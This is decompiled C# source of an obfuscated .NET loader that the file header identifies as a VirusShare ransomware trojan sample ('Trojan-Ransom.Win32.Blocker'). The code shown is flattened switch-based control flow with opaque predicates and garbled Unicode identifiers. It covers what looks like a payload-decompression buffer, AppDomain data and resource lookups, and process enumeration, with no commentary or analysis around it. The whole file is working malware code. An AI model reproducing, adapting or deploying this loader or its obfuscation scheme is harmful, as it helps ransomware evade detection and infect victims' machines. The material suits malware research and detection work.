// Decompiled with JetBrains decompiler
// Type: 
// Assembly: jizbwcwvchLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B60D9367-1A45-4565-96B0-53F2CD92A512
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.bdzb-39b748d8a4dd59a65e8a25c296dfc3aa1df8ddf8.exe

using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using Ⴍ;

public class \u0003
{
  public byte[] \u0002;
  private uint Ⴃ;
  public uint \u000E;
  public uint \u000F;
  public uint \u0002\u2000;
  private uint Ⴗ;
  private uint Ⴓ;
  public uint \u0006\u2000;
  private \u0005\u2000.ႠႥ Ⴄ = new \u0005\u2000.ႠႥ();
  protected uint[] Ⴍ;
  protected uint[] Ⴅ;
  protected bool Ⴍ;
  protected uint Ⴜ;

  public \u0003() => ႷႳ.Ⴈ();

  public virtual void \u0003\u2009\u2001\u0002()
  {
  }

  public virtual void \u0003\u2009\u2001\u0003()
  {
  }

  public void \u0005()
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    int num1 = 5;
    uint num2;
    uint num3;
    uint index;
    while (true)
    {
      switch (num1)
      {
        case 0:
          num1 = index < num3 ? (int) ⴍ[533] / 5 : 3;
          continue;
        case 1:
          num3 = this.\u000E + this.\u0006\u2000 - num2;
          index = 0U;
          num1 = (int) ⴗ[165] - 225;
          continue;
        case 3:
          goto label_8;
        case 4:
        case 8:
          ++index;
          num1 = 0;
          continue;
        case 6:
          num1 = (int) ⴗ[82];
          continue;
        case 7:
          this.\u0002[(IntPtr) index] = this.\u0002[(IntPtr) (num2 + index)];
          num1 = 4;
          continue;
        default:
          this.\u0003\u2009\u2001\u0002();
          num2 = this.\u000E + this.\u0002\u2000 - this.Ⴗ;
          goto case 6;
      }
    }
label_8:
    this.\u000E -= num2;
    this.\u0003\u2009\u2001\u0003();
  }

  public virtual void \u0003\u2009\u2001\u0008()
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    int num1 = 0;
    while (true)
    {
      switch (num1)
      {
        case 2:
          goto label_19;
        case 4:
          goto label_20;
        default:
          if (this.Ⴄ.Ⴐ)
          {
            num1 = (int) ⴗ[100] - 222;
            continue;
          }
          goto label_7;
      }
    }
label_19:
    return;
label_20:
    return;
label_7:
    int num2 = -(int) this.\u000E + (int) this.\u000F - (int) this.\u0006\u2000;
    int num3 = 5;
    int num4;
    uint num5;
    while (true)
    {
      switch (num3)
      {
        case 0:
          num3 = 13;
          continue;
        case 1:
          num3 = 7;
          continue;
        case 3:
          this.Ⴃ = this.\u0006\u2000;
          num5 = this.\u000E + this.Ⴃ;
          num3 = 14;
          continue;
        case 4:
          num4 = \u000E.ႳႥ(this.Ⴄ.Ⴍ, this.\u0002, (int) this.\u000E + (int) this.\u0006\u2000, num2, 'Ł', 344);
          goto case 0;
        case 5:
          num3 = num2 != 0 ? 4 : (int) ⴍ[92] - 36;
          continue;
        case 6:
          goto label_4;
        case 7:
          goto label_7;
        case 8:
          this.Ⴃ = this.Ⴄ.Ⴓ - this.\u000E;
          int num6 = (int) ⴗ[22];
          Ⴍ.Ⴜ.Ⴗ[23] = (byte) (((int) Ⴍ.Ⴜ.Ⴗ[23] | (int) Ⴍ.Ⴜ.Ⴗ[142]) & 60);
          num3 = num6 - 147;
          continue;
        case 9:
        case 10:
          this.\u0006\u2000 += (uint) num4;
          num3 = this.\u0006\u2000 < this.\u0002\u2000 + this.Ⴄ.Ⴅ ? 7 : 12;
          continue;
        case 11:
          goto label_15;
        case 12:
          this.Ⴃ = this.\u0006\u2000 - this.Ⴄ.Ⴅ;
          goto case 1;
        case 13:
          num3 = num4 != 0 ? (int) ⴗ[123] - 112 : (int) ⴗ[15] - 95;
          continue;
        case 14:
          num3 = num5 <= this.Ⴄ.Ⴓ ? (int) ⴗ[174] - 68 : 8;
          continue;
        default:
          goto label_6;
      }
    }
label_4:
    return;
label_6:
    // ISSUE: method reference
    RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.\u0003\u2009\u2001\u0008);
    return;
label_15:
    this.Ⴄ.Ⴐ = true;
  }

  private void Ⴅ() => this.\u0002 = (byte[]) null;

  public void \u0002(uint _param1, uint _param2, uint _param3)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    int num1 = 5;
    uint num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
          this.\u0002 = new byte[(IntPtr) this.\u000F];
          num1 = 7;
          continue;
        case 1:
        case 3:
          this.Ⴅ();
          this.\u000F = num2;
          goto case 0;
        case 2:
          num1 = (int) this.\u000F == (int) num2 ? (int) ⴗ[72] : 3;
          continue;
        case 4:
          this.Ⴓ = _param3;
          goto case 6;
        case 6:
          num2 = _param1 + _param2 + _param3;
          num1 = this.\u0002 == null ? (int) ⴗ[114] - 226 : 2;
          continue;
        case 7:
          goto label_8;
        default:
          this.Ⴗ = _param1;
          this.Ⴄ.Ⴅ = _param2;
          num1 = 4;
          continue;
      }
    }
label_8:
    this.Ⴄ.Ⴓ = this.\u000F - _param2;
  }

  public void \u0005\u2009\u2001\u0002(Stream _param1)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    int num1 = 0;
    while (true)
    {
      switch (num1)
      {
        case 1:
        case 2:
          goto label_5;
        case 3:
          this.\u0002\u2000 = 0U;
          this.\u0006\u2000 = 0U;
          goto case 4;
        case 4:
          this.Ⴄ.Ⴐ = false;
          num1 = 2;
          continue;
        case 5:
          goto label_6;
        default:
          this.Ⴄ.Ⴍ = (MarshalByRefObject) _param1 as Stream;
          this.\u000E = 0U;
          int num2 = (int) ⴗ[43];
          \u0003\u2002.Ⴍ[420] = (byte) ((int) \u0003\u2002.Ⴍ[420] + (int) \u0003\u2002.Ⴍ[356] & 252);
          num1 = num2 - 29;
          continue;
      }
    }
label_6:
    return;
label_5:
    this.\u0003\u2009\u2001\u0008();
  }

  public void \u0005\u2009\u2001\u0002() => this.Ⴄ.Ⴍ = (MarshalByRefObject) null as Stream;

  public void \u0005\u2009\u2001\u0003()
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    int num1 = 3;
    uint num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 6:
          num1 = num2 <= this.Ⴄ.Ⴓ ? 7 : (int) ⴗ[160] - 198;
          continue;
        case 1:
          num2 = this.\u000E + this.\u0002\u2000;
          goto case 0;
        case 2:
          goto label_7;
        case 4:
          goto label_8;
        case 5:
          goto label_5;
        case 7:
          goto label_6;
        default:
          ++this.\u0002\u2000;
          num1 = this.\u0002\u2000 <= this.Ⴃ ? (int) ⴗ[123] - 118 : 1;
          continue;
      }
    }
label_7:
    return;
label_8:
    return;
label_5:
    this.\u0005();
label_6:
    this.\u0003\u2009\u2001\u0008();
  }

  public byte \u0005\u2009\u2001\u0002(int _param1)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    return this.\u0002[(long) (this.\u000E + this.\u0002\u2000) + (long) _param1];
  }

  public uint \u0005\u2009\u2001\u0002(int _param1, uint _param2, uint _param3)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int num1 = !this.Ⴄ.Ⴐ ? 7 : 8;
    uint num2;
    uint num3;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 11:
          num1 = num3 >= _param3 ? (int) ⴍ[392] - 77 : 12;
          continue;
        case 1:
        case 4:
          _param3 = this.\u0006\u2000 - (uint) ((ulong) this.\u0002\u2000 + (ulong) _param1);
          num1 = 7;
          continue;
        case 3:
          goto label_11;
        case 5:
          num3 = 0U;
          num1 = 0;
          continue;
        case 6:
        case 7:
          ++_param2;
          num2 = (uint) ((int) this.\u000E + (int) this.\u0002\u2000 + _param1);
          num1 = 5;
          continue;
        case 8:
          num1 = (long) this.\u0002\u2000 + (long) _param1 + (long) _param3 <= (long) this.\u0006\u2000 ? 7 : 1;
          continue;
        case 9:
          goto label_3;
        case 10:
          ++num3;
          num1 = 0;
          continue;
        case 12:
          num1 = (int) this.\u0002[(IntPtr) (num2 + num3)] == (int) this.\u0002[(IntPtr) (num2 + num3 - _param2)] ? 10 : (int) ⴗ[91] - (int) ⴗ[114];
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.\u0005\u2009\u2001\u0002);
          num1 = 9;
          continue;
      }
    }
label_11:
    return num3;
  }

  public uint \u0005\u2009\u2001\u0002()
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    return this.\u0006\u2000 - this.\u0002\u2000;
  }

  public void \u0002(int _param1)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    int num = 1;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 2:
        case 4:
          goto label_3;
        default:
          this.\u000E += (uint) _param1;
          this.Ⴃ -= (uint) _param1;
          num = (int) ⴗ[82] * 4;
          continue;
      }
    }
label_3:
    this.\u0002\u2000 -= (uint) _param1;
    this.\u0006\u2000 -= (uint) _param1;
  }

  static \u0003() => \u0006.Ⴀ();

  internal static long Ⴄ()
  {
label_3:
    int num1 = 1985;
    int num2 = num1;
    int num3 = (num2 * num2 + num1) % 2 == 0 ? 5 : 0;
    while (true)
    {
      switch (num3)
      {
        case 0:
        case 7:
          num3 = 6;
          continue;
        case 1:
        case 6:
          goto label_6;
        case 2:
        case 5:
          \u0003.Ⴄ();
          num3 = 6;
          continue;
        case 4:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.Ⴄ);
          num3 = 4;
          continue;
      }
    }
label_6:
    return 2;
  }

  internal static object Ⴀ()
  {
label_3:
    \u0006.ႭႭ(627, 'ș').SetData(\u000E.Ⴓ(2088295580, 3, 11L, (byte) 23), (object) null);
label_4:
    int num = 1;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 2:
          goto label_4;
        case 1:
          goto label_5;
        case 4:
        case 5:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.Ⴀ);
          num = 4;
          continue;
      }
    }
label_5:
    return (object) null;
  }

  internal static string Ⴃ()
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int index = 0;
    Array array = (Array) \u0003.Ⴐ(\u0006.ႭႭ(917, 'Ͼ'), \u000E.Ⴓ(2088295575, 8, 13L, (byte) 11), 258, (short) 298);
    int num1 = 17;
    while (true)
    {
      switch (num1)
      {
        case 0:
          num1 = (byte) 208 == (array as byte[])[index] ? 3 : (int) ⴍ[341] - 75;
          continue;
        case 1:
        case 22:
          goto label_24;
        case 2:
          goto label_14;
        case 3:
          ++index;
          num1 = (int) ⴍ[11];
          continue;
        case 4:
        case 7:
          num1 = (byte) 8 == ((byte[]) array)[index] ? 25 : 28;
          continue;
        case 5:
          num1 = (byte) 248 == (array as byte[])[index] ? 29 : (int) ⴍ[529] - 117;
          continue;
        case 8:
          ႷႳ.Ⴃ();
          num1 = (int) ⴍ[116] - 98;
          continue;
        case 9:
          goto label_19;
        case 10:
          ႷႳ.Ⴄ();
          num1 = (int) ⴗ[67] * 8;
          continue;
        case 11:
          num1 = (array as byte[])[index] < (byte) 248 ? 9 : (int) ⴗ[166] - 135;
          continue;
        case 12:
        case 14:
          goto label_9;
        case 13:
          ႷႳ.Ⴄ();
          num1 = 23;
          continue;
        case 15:
          int num2 = (int) ႷႰ.Ⴍ();
          num1 = (int) ⴗ[89] - 201;
          continue;
        case 16:
          goto label_28;
        case 17:
          num1 = ((byte[]) array)[index] < (byte) 8 ? (int) ⴗ[85] - 12 : (int) ⴍ[146];
          continue;
        case 18:
          num1 = (byte) 29 == ((byte[]) array)[index] ? 23 : (int) ⴗ[4];
          continue;
        case 19:
          num1 = (byte) 218 == ((byte[]) array)[index] ? (int) ⴗ[15] - 82 : 10;
          continue;
        case 20:
          num1 = ((byte[]) array)[index] < (byte) 29 ? 2 : 18;
          continue;
        case 21:
          num1 = (array as byte[])[index] < (byte) 208 ? 12 : (int) ⴍ[53] - 9;
          continue;
        case 23:
          ++index;
          num1 = 11;
          continue;
        case 24:
          goto label_3;
        case 25:
          ++index;
          num1 = (int) ⴗ[122] - (int) ⴗ[111];
          continue;
        case 26:
          goto label_4;
        case 27:
          num1 = ((byte[]) array)[index] < (byte) 218 ? 1 : 19;
          continue;
        case 28:
          int num3 = (int) ႷႰ.Ⴅ();
          num1 = 25;
          continue;
        case 29:
          ++index;
          num1 = 27;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.Ⴃ);
          num1 = 24;
          continue;
      }
    }
label_4:
    return (string) null;
label_9:
    return (string) null;
label_14:
    return (string) null;
label_19:
    return (string) null;
label_24:
    return (string) null;
label_28:
    int num4 = index + 1;
    return (string) null;
  }

  internal static byte Ⴓ()
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int index = 0;
label_4:
    object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(845, '̡'), \u000E.Ⴓ(2088295576, 7, 12L, (byte) 31), 748, (short) 709);
    int num1 = 6;
    while (true)
    {
      switch (num1)
      {
        case 1:
          num1 = (byte) 8 == (obj as byte[])[index] ? (int) ⴗ[99] - 98 : 2;
          continue;
        case 2:
          ႷႰ.Ⴈ();
          num1 = 9;
          continue;
        case 4:
          goto label_4;
        case 5:
          goto label_5;
        case 6:
        case 8:
          num1 = (obj as byte[])[index] < (byte) 8 ? 5 : 1;
          continue;
        case 7:
          goto label_3;
        case 9:
          goto label_9;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.Ⴓ);
          num1 = 7;
          continue;
      }
    }
label_5:
    return 0;
label_9:
    int num2 = index + 1;
    return 31;
  }

  internal static void Ⴗ()
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    int index;
    switch (4)
    {
      case 0:
      case 1:
      case 2:
        Array array = (Array) \u0003.Ⴐ(\u0006.ႭႭ(173, 'À'), \u000E.Ⴓ(2088295578, 5, 0L, (byte) 16), 207, (short) 229);
label_6:
        while (((byte[]) array)[index] >= (byte) 8)
        {
          int num1 = 12;
          while (true)
          {
            switch (num1)
            {
              case 1:
                num1 = (array as byte[])[index] < (byte) 208 ? 2 : (int) ⴍ[369];
                continue;
              case 2:
                goto label_3;
              case 3:
                \u000E.Ⴄ();
                num1 = 8;
                continue;
              case 4:
                goto label_11;
              case 5:
                num1 = (byte) 29 == ((byte[]) array)[index] ? (int) ⴍ[83] - (int) ⴍ[507] : (int) ⴗ[12] - (int) ⴗ[33];
                continue;
              case 6:
                ႷႰ.Ⴐ();
                num1 = 10;
                continue;
              case 7:
                ႷႳ.Ⴐ();
                num1 = 16;
                continue;
              case 8:
                goto label_19;
              case 9:
                num1 = ((byte[]) array)[index] < (byte) 29 ? 4 : (int) ⴗ[49] - 246;
                continue;
              case 10:
              case 13:
                ++index;
                num1 = (int) ⴍ[7];
                continue;
              case 11:
              case 15:
                num1 = (byte) 208 == (array as byte[])[index] ? (int) ⴍ[364] - 235 : 7;
                continue;
              case 12:
              case 17:
                num1 = (byte) 8 == (array as byte[])[index] ? 10 : (int) ⴗ[8] - 162;
                continue;
              case 14:
                goto label_6;
              case 16:
                ++index;
                num1 = 9;
                continue;
              default:
                goto label_5;
            }
          }
label_3:
          break;
label_11:
          break;
label_5:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.Ⴗ);
          break;
label_19:
          int num2 = index + 1;
          break;
        }
        break;
      case 3:
        break;
      default:
        index = 0;
        goto case 0;
    }
  }

  internal static object Ⴐ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] short obj3)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int num1 = 0;
    int num2 = 33;
    object obj;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 1:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 2:
          obj = obj0.GetData(obj1);
          num2 = (int) ⴍ[139] - 46;
          continue;
        case 3:
          obj = obj0.GetData(obj1);
          num2 = (int) ⴗ[4];
          continue;
        case 4:
          num2 = num3 % 2 != 0 ? 33 : 12;
          continue;
        case 5:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 6:
          obj = obj0.GetData(obj1);
          num2 = (int) ⴗ[4];
          continue;
        case 7:
          goto label_3;
        case 8:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 9:
          obj = obj0.GetData(obj1);
          num2 = (int) ⴗ[4];
          continue;
        case 10:
          obj = obj0.GetData(obj1);
          goto case 15;
        case 11:
        case 31:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 12:
          goto label_77;
        case 13:
          ++num1;
          int num4 = (int) obj3;
          int num5 = num4 * num4;
          num3 = (int) obj3 + num5;
          num2 = 4;
          continue;
        case 14:
          obj = obj0.GetData(obj1);
          num2 = (int) ⴗ[4];
          continue;
        case 15:
          num2 = (int) ⴍ[214] - (int) ⴍ[567];
          continue;
        case 16:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 17:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 18:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 19:
        case 33:
          int num6;
          switch ((obj2 ^ (int) obj3) - 40 ^ num1)
          {
            case 0:
              num6 = (int) ⴗ[59];
              break;
            case 1:
              num6 = 16;
              break;
            case 2:
              num6 = 10;
              break;
            case 3:
              num6 = 18;
              break;
            case 4:
              num6 = 6;
              break;
            case 5:
              num6 = (int) ⴗ[79] - 187;
              break;
            case 6:
              num6 = 37;
              break;
            case 7:
              num6 = (int) ⴗ[120] + 7;
              break;
            case 8:
              num6 = (int) ⴗ[130] - 154;
              break;
            case 9:
              num6 = (int) ⴍ[429] - 92;
              break;
            case 10:
              num6 = (int) ⴍ[107];
              break;
            case 11:
              num6 = 14;
              break;
            case 12:
              num6 = (int) ⴍ[142] / 9;
              break;
            case 13:
              num6 = 28;
              break;
            case 14:
              num6 = (int) ⴍ[53];
              break;
            case 15:
              num6 = 36;
              break;
            case 16:
              num6 = 20;
              break;
            case 17:
              num6 = (int) ⴗ[135] - 104;
              break;
            case 18:
              num6 = (int) ⴍ[7];
              break;
            case 19:
              num6 = 34;
              break;
            case 20:
              num6 = 27;
              break;
            case 21:
              num6 = (int) ⴍ[27] - (int) ⴍ[164];
              break;
            case 22:
              num6 = 41;
              break;
            case 23:
              num6 = 25;
              break;
            case 24:
              num6 = 22;
              break;
            case 25:
              num6 = 2;
              break;
            case 26:
              num6 = (int) ⴍ[86] - 36;
              break;
            case 27:
              num6 = 5;
              break;
            case 28:
              num6 = 8;
              break;
            case 29:
              num6 = 42;
              break;
            case 30:
              num6 = 3;
              break;
            case 31:
              num6 = (int) ⴗ[85];
              break;
            case 32:
              num6 = 35;
              break;
            default:
              num6 = 40;
              break;
          }
          num2 = num6;
          continue;
        case 20:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 21:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 22:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 23:
          obj = obj0.GetData(obj1);
          num2 = (int) ⴍ[13] - 43;
          continue;
        case 24:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 25:
          obj = obj0.GetData(obj1);
          num2 = (int) ⴗ[4];
          continue;
        case 26:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 27:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 28:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 29:
          obj = obj0.GetData(obj1);
          num2 = (int) ⴍ[603] - (int) ⴍ[214];
          continue;
        case 30:
          obj = obj0.GetData(obj1);
          num2 = (int) ⴍ[474] - (int) ⴍ[46];
          continue;
        case 32:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 34:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 35:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 36:
          obj = obj0.GetData(obj1);
          num2 = (int) ⴍ[82] - 103;
          continue;
        case 37:
          obj = obj0.GetData(obj1);
          num2 = (int) ⴍ[320] - 13;
          continue;
        case 38:
          obj = obj0.GetData(obj1);
          num2 = (int) ⴍ[532] - 189;
          continue;
        case 40:
          obj = (object) null;
          num2 = 13;
          continue;
        case 41:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        case 42:
          obj = obj0.GetData(obj1);
          num2 = 13;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.Ⴐ);
          num2 = 7;
          continue;
      }
    }
label_77:
    return obj;
  }

  internal static object Ⴈ(
    [In] ResourceManager obj0,
    [In] string obj1,
    [In] CultureInfo obj2,
    [In] int obj3,
    [In] short obj4)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴍ[51];
    Ⴍ.Ⴜ.Ⴗ[158] = (byte) ((int) Ⴍ.Ⴜ.Ⴗ[158] & obj3 & 214);
    int num3 = num2 - 31;
    object obj;
    int num4;
    while (true)
    {
      switch (num3)
      {
        case 0:
          obj = obj0.GetObject(obj1, obj2);
          goto case 5;
        case 1:
        case 2:
          num4 = 331;
          goto case 6;
        case 4:
          goto label_3;
        case 5:
          ++num1;
          num3 = 1;
          continue;
        case 6:
          num3 = 3234 > 462 - num4 * 7 ? (int) ⴍ[13] / 7 : 7;
          continue;
        case 7:
          num3 = (int) ⴗ[92] - (int) ⴗ[92];
          continue;
        case 8:
          goto label_9;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.Ⴈ);
          num3 = (int) ⴗ[48] / 2;
          continue;
      }
    }
label_9:
    return obj;
  }

  internal static string Ⴍ([In] string obj0, [In] string obj1, [In] char obj2, [In] short obj3)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴗ[5] - 156;
    IComparable<string> comparable;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 1:
          comparable = (IComparable<string>) obj1;
          num2 = 7;
          continue;
        case 3:
        case 10:
          goto label_15;
        case 4:
          goto label_3;
        case 5:
          comparable = (IComparable<string>) (obj0 + obj1);
          num2 = (int) ⴍ[272];
          continue;
        case 6:
          comparable = (IComparable<string>) (obj0 + obj1);
          num2 = 7;
          continue;
        case 7:
          ++num1;
          goto case 8;
        case 8:
          \u0003\u2002.Ⴍ[244] = (byte) ((int) \u0003\u2002.Ⴍ[244] & (int) obj3 & 178);
          num2 = 8980 > 898 - 828 * 10 ? (int) ⴗ[120] : 9;
          continue;
        case 9:
          num2 = 11;
          continue;
        case 11:
          int num3;
          switch (((int) obj3 ^ (int) obj2) - 12 ^ num1)
          {
            case 0:
              num3 = 6;
              break;
            case 1:
              num3 = 5;
              break;
            default:
              num3 = 1;
              break;
          }
          num2 = num3;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.Ⴍ);
          num2 = 4;
          continue;
      }
    }
label_15:
    return comparable as string;
  }

  internal static Encoding Ⴜ([In] char obj0, [In] int obj1)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴗ[78] - 15;
    object utF8;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = 5;
          continue;
        case 1:
        case 2:
        case 6:
          goto label_3;
        case 4:
        case 7:
          goto label_6;
        case 5:
          utF8 = (object) Encoding.UTF8;
          ++num1;
          int num3 = (int) obj0;
          num2 = (num3 * num3 + (int) obj0) % 2 == 0 ? 7 : 0;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.Ⴜ);
          num2 = (int) ⴍ[7];
          continue;
      }
    }
label_6:
    return (Encoding) utF8;
  }

  internal static string ႣႰ([In] ResolveEventArgs obj0, [In] char obj1, [In] int obj2)
  {
label_3:
    int num1 = 0;
    int num2 = 2;
    IConvertible name;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 3:
          num3 = (int) obj1 + num3;
          num2 = num3 % 2 != 0 ? 2 : 1;
          continue;
        case 1:
          goto label_7;
        case 2:
          name = (IConvertible) obj0.Name;
          goto case 4;
        case 4:
          ++num1;
          int num4 = (int) obj1;
          num3 = num4 * num4;
          num2 = 3;
          continue;
        case 7:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.ႣႰ);
          num2 = 7;
          continue;
      }
    }
label_7:
    return name as string;
  }

  internal static int ႣႣ([In] string obj0, [In] char obj1, [In] short obj2)
  {
label_3:
    int num1 = 0;
    int num2 = 5;
    int length;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 3:
          goto label_7;
        case 1:
        case 2:
          goto label_3;
        case 4:
          num3 = (int) obj1 + num3;
          num2 = num3 % 2 != 0 ? 5 : 0;
          continue;
        case 5:
          length = obj0.Length;
          ++num1;
          goto case 7;
        case 7:
          int num4 = (int) obj1;
          num3 = num4 * num4;
          num2 = 4;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.ႣႣ);
          num2 = 2;
          continue;
      }
    }
label_7:
    return length;
  }

  internal static string ႣႨ([In] string obj0, [In] string obj1, [In] string obj2, [In] short obj3, [In] int obj4)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int num1 = 0;
    int num2 = 5;
    object obj;
    while (true)
    {
      switch (num2)
      {
        case 0:
          goto label_7;
        case 2:
        case 3:
          int num3 = (int) obj3;
          int num4 = num3 * num3;
          num2 = ((int) obj3 + num4) % 2 != 0 ? (int) ⴍ[425] - 192 : 0;
          continue;
        case 4:
          num2 = (int) ⴍ[107] / 7;
          continue;
        case 5:
          obj = (object) obj0.Replace(obj1, obj2);
          ++num1;
          goto case 4;
        case 6:
        case 7:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.ႣႨ);
          num2 = 6;
          continue;
      }
    }
label_7:
    return (string) obj;
  }

  internal static Process[] ႣႤ([In] int obj0, [In] char obj1)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int num1 = 0;
    int num2 = 6;
    Array processes;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 3:
          num2 = (int) ⴗ[82] * 6;
          continue;
        case 1:
          num2 = (int) ⴍ[146];
          continue;
        case 4:
          num2 = 5950 > 595 - num3 * 10 ? 5 : 3;
          continue;
        case 5:
        case 7:
          goto label_8;
        case 6:
          processes = (Array) Process.GetProcesses();
          ++num1;
          num3 = 94;
          goto case 1;
        case 8:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.ႣႤ);
          num2 = (int) ⴗ[48];
          continue;
      }
    }
label_8:
    return (Process[]) processes;
  }
}
